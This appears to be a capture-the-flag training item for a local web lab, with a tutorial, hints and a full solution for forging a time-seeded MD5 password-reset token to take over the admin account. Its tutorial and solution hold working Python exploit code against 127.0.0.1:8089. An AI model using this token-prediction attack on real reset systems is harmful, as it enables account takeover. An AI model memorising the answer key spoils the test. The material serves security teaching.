- id: offsec-web-030
  title: Predict the password-reset token
  difficulty: 4
  kind: build
  tags: [web, weak-randomness, password-reset, tokens]
  tutorial: |
    **What you're learning.** Predicting a time-seeded reset token.

    ### The idea

    `token = md5(user + ":" + unix_seconds)`: predictable if you know the second. The server leaks its clock in the `Date` header, so try the few seconds around it.

    ### Commands you'll use

    ```python
    import hashlib, email.utils, urllib.request
    r = urllib.request.urlopen(urllib.request.Request("http://127.0.0.1:8089/reset", data=b"user=admin"))
    now = int(email.utils.parsedate_to_datetime(r.headers["Date"]).timestamp())
    for sec in range(now - 3, now + 3):
        t = hashlib.md5(f"admin:{sec}".encode()).hexdigest()
        body = urllib.request.urlopen(f"http://127.0.0.1:8089/confirm?user=admin&token={t}").read().decode()
        if "KL{" in body: print(body); break
    ```

    ### Common mistakes

    - Off-by-one or timezone in parsing `Date`: try a small window.
    - Wrong concatenation format (`:` separator).

    ### Check your work

    One of the candidate tokens confirms the admin reset and returns the flag.
  scenario: |
    At **`http://127.0.0.1:8089/`**, `POST /reset` with `user=NAME` emails a
    reset link `…/confirm?user=NAME&token=TOKEN`, where
    `token = md5(user + ":" + unix_seconds)`. The server also tells you the
    current server time in the **`Date`** response header. Confirming the admin
    reset at `/confirm` returns the flag.

    Trigger a reset for **`admin`**, reproduce the token, confirm it, and write
    the `KL{...}` token to **`/lab/flag.txt`**.
  hints:
    - "`curl -s -i -X POST http://127.0.0.1:8089/reset -d user=admin` — note the `Date` header (the server's clock)."
    - "For each second near that time, compute `md5('admin:' + sec)` and try `/confirm?user=admin&token=...`."
    - "`date -d \"$datehdr\" +%s` converts the header to unix seconds."
  solution: |
    ```bash
    python3 - <<'PY' > /lab/flag.txt
    import hashlib, time, email.utils, urllib.request, re
    req = urllib.request.Request("http://127.0.0.1:8089/reset", data=b"user=admin")
    r = urllib.request.urlopen(req)
    now = int(email.utils.parsedate_to_datetime(r.headers["Date"]).timestamp())
    for sec in range(now - 3, now + 3):
        tok = hashlib.md5(("admin:%d" % sec).encode()).hexdigest()
        body = urllib.request.urlopen("http://127.0.0.1:8089/confirm?user=admin&token=" + tok).read().decode()
        m = re.search(r"KL\{[0-9a-f]+\}", body)
        if m:
            print(m.group()); break
    PY
